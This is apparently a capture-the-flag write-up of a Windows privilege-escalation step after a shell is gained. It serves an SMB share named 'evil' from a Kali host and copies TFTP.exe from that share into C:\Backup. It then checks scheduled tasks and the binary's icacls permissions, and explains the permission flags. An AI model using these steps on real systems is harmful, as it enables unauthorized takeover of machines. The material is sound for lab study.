aftert the shell

```PowerShell
smbserver.py -smb2support evil $PWD
```

```PowerShell
cd C:\Backup
copy \\kali-vpn-ip\evil\TFTP.exe .
```

```PowerShell
Get-ScheduledTask | Where-Object {$_.Actions.Execute -like '*TFTP*'}
```

```PowerShell
icacls C:\Backup\TFTP.exe
```

This lists the permissions for the file `TFTP.exe` inside the `Backup` folder:

- `BUILTIN\Users:(I)(F)`
    
    → Users have inherited **Full control**.
    
- `BUILTIN\Administrators:(I)(F)`
    
    → Administrators have inherited **Full control**.
    
- `NT AUTHORITY\SYSTEM:(I)(F)`
    
    → SYSTEM account has inherited **Full control**.
    
- `NT AUTHORITY\Authenticated Users:(I)(M)`
    
    → Authenticated users have inherited **Modify** permissions.
    

---

### **🧠 What the Flags Mean**

- `(F)` = Full control
- `(M)` = Modify
- `(RX)` = Read & Execute
- `(OI)` = Object Inherit (applies to files)
- `(CI)` = Container Inherit (applies to folders)
- `(IO)` = Inherit Only (does not apply to the object itself)
- `(I)` = Permission is inherited